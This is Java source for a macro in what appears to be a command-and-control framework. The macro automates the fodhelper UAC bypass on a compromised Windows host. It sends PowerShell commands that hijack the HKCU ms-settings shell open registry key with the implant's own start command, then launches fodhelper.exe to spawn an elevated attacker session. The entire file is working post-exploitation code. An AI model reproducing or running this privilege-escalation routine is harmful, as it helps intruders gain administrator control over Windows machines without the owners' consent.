package c2.session.macro;

import c2.HarvestProcessor;
import c2.session.IOManager;

public class SpawnFodhelperElevatedSessionMacro extends AbstractCommandMacro {

	public static final String COMMAND = "spawn_fodhelper_elevated_session";
	public static final String NEW_ITEM_CMD = "powershell.exe -c \"New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force\"";
	public static final String NEW_ITEM_PROP_CMD = "powershell.exe -c \"New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force";
	public static final String SET_ITEM_PROP_CMD_B = "' -Force \"";
	public static final String SET_ITEM_PROP_CMD_A = "powershell.exe -c \"Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value '";
	public static final String CLIENT_GET_EXE_CMD = "get_daemon_start_cmd";
	public static final String ENGAGE_FODHELPER_CMD = "fodhelper.exe";
	private IOManager io;
	
	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.equalsIgnoreCase(COMMAND);
	}

	@Override
	public void initialize(IOManager io, HarvestProcessor harvestProcessor) {
		this.io = io;
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		io.sendCommand(sessionId, CLIENT_GET_EXE_CMD);
		outcome.addSentCommand(CLIENT_GET_EXE_CMD);
		String clientCmd = io.awaitMultilineCommands(sessionId);
		outcome.addResponseIo(clientCmd);
		clientCmd = clientCmd.replace("\r", "");
		clientCmd = clientCmd.replace("\n", "");
		outcome.addSentCommand(NEW_ITEM_CMD);
		io.sendCommand(sessionId, NEW_ITEM_CMD);
		outcome.addSentCommand(NEW_ITEM_PROP_CMD);
		io.sendCommand(sessionId, NEW_ITEM_PROP_CMD);
		String fodHelperCmd = SET_ITEM_PROP_CMD_A + clientCmd + SET_ITEM_PROP_CMD_B;
		outcome.addSentCommand(fodHelperCmd);
		io.sendCommand(sessionId, fodHelperCmd);
		outcome.addSentCommand(ENGAGE_FODHELPER_CMD);
		io.sendCommand(sessionId, ENGAGE_FODHELPER_CMD);
		outcome.addMacroMessage("Fodhelper engaged, new elevated session should be available if current user has elevated privs");
		return outcome;
	}

}
